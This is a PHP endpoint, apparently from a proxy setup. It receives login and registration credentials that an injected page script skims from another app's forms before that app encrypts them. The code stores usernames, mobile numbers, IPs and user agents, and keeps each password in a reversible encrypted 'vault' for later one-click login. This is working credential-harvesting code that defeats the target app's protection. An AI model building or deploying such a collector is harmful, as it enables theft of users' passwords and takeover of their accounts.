<?php
/**
 * Same-origin credential collector.
 *
 * The app encrypts login/register bodies (RSA-wrapped AES) so the proxy only
 * ever sees ciphertext. The injected page shim therefore reads the form values
 * BEFORE encryption and posts them here over the same origin. We keep a
 * password_hash() plus an AES-256-GCM vault copy (for one-click login only)
 * and never log or echo the plaintext.
 *
 * Guards: POST only, same-origin, signed day-scoped nonce, per-IP rate limit.
 */

require_once dirname(__DIR__) . '/admin/store.php';

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Robots-Tag: noindex, nofollow');

function collector_reply(int $code, array $payload): void
{
    http_response_code($code);
    echo json_encode($payload, JSON_UNESCAPED_SLASHES);
    exit;
}

if (strtoupper((string) ($_SERVER['REQUEST_METHOD'] ?? 'GET')) !== 'POST') {
    collector_reply(405, ['ok' => false, 'error' => 'method']);
}

// Same-origin only. Modern browsers send Sec-Fetch-Site; older ones send Origin.
$site = (string) ($_SERVER['HTTP_SEC_FETCH_SITE'] ?? '');
if ($site !== '' && $site !== 'same-origin' && $site !== 'same-site' && $site !== 'none') {
    collector_reply(403, ['ok' => false, 'error' => 'origin']);
}
$origin = (string) ($_SERVER['HTTP_ORIGIN'] ?? '');
if ($origin !== '') {
    // Compare hostnames only: on non-standard ports HTTP_HOST carries the port
    // (127.0.0.1:8150) while Origin's host never does, so comparing the raw
    // strings rejected every real browser capture with a 403.
    $ohost = strtolower((string) parse_url($origin, PHP_URL_HOST));
    $selfHost = strtolower((string) preg_replace('/:\d+$/', '', (string) ($_SERVER['HTTP_HOST'] ?? '')));
    if ($ohost !== '' && $selfHost !== '' && $ohost !== $selfHost) {
        collector_reply(403, ['ok' => false, 'error' => 'origin']);
    }
}

$ip = px_collect_ip();
if (!rate_limit_hit('collect:' . $ip, 60, 60)) {
    collector_reply(429, ['ok' => false, 'error' => 'rate']);
}

$raw = (string) file_get_contents('php://input');
if ($raw === '' || strlen($raw) > 8192) {
    collector_reply(400, ['ok' => false, 'error' => 'body']);
}
$in = json_decode($raw, true);
if (!is_array($in)) {
    collector_reply(400, ['ok' => false, 'error' => 'json']);
}

if (!capture_nonce_ok((string) ($in['nonce'] ?? ''))) {
    collector_reply(403, ['ok' => false, 'error' => 'nonce']);
}

/** 11-digit BD mobile -> <mobile>7; anything else is passed through digits-only. */
function px_collect_suffix(string $v): string
{
    $d = preg_replace('/\D/', '', $v);
    if (preg_match('/^01[3-9]\d{8}$/', $d)) {
        return $d . '7';
    }
    return $d;
}

function px_collect_ip(): string
{
    $fwd = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? '');
    if ($fwd !== '') {
        $first = trim(explode(',', $fwd)[0]);
        if ($first !== '' && filter_var($first, FILTER_VALIDATE_IP)) {
            return $first;
        }
    }
    return (string) ($_SERVER['REMOTE_ADDR'] ?? '');
}

$password = (string) ($in['password'] ?? '');
if ($password === '' || strlen($password) > 128) {
    collector_reply(400, ['ok' => false, 'error' => 'password']);
}

$mobileRaw = (string) ($in['mobile_raw'] ?? '');
$mobileSuf = px_collect_suffix((string) ($in['mobile_suffixed'] ?? ''));
if ($mobileSuf === '') {
    $mobileSuf = px_collect_suffix($mobileRaw);
}

$username = trim((string) ($in['username'] ?? ''));
$username = preg_replace('/[^\x21-\x7e]/', '', $username); // no control/space chars
if ($username === '') {
    $username = $mobileSuf;
}
// If the login id itself is a bare 11-digit mobile, suffix it too.
if (preg_match('/^01[3-9]\d{8}$/', $username)) {
    $username = $username . '7';
}
if ($username === '' || strlen($username) > 64) {
    collector_reply(400, ['ok' => false, 'error' => 'username']);
}

$source = (string) ($in['source'] ?? 'captured');
if (!in_array($source, ['register', 'login', 'captured'], true)) {
    $source = 'captured';
}

$patch = [
    'username'        => $username,
    'mobile_raw'      => preg_replace('/\D/', '', $mobileRaw),
    'mobile_suffixed' => $mobileSuf,
    'pass_hash'       => password_hash($password, PASSWORD_DEFAULT),
    'vault'           => vault_encrypt($password),
    'source'          => $source,
    'last_ip'         => $ip,
    'user_agent'      => substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 300),
];
if ($source === 'login') {
    $patch['last_login_at'] = date('c');
}

if (!players_upsert($patch)) {
    collector_reply(500, ['ok' => false, 'error' => 'store']);
}

// The plaintext password is now out of scope and was never written or logged.
collector_reply(200, ['ok' => true]);
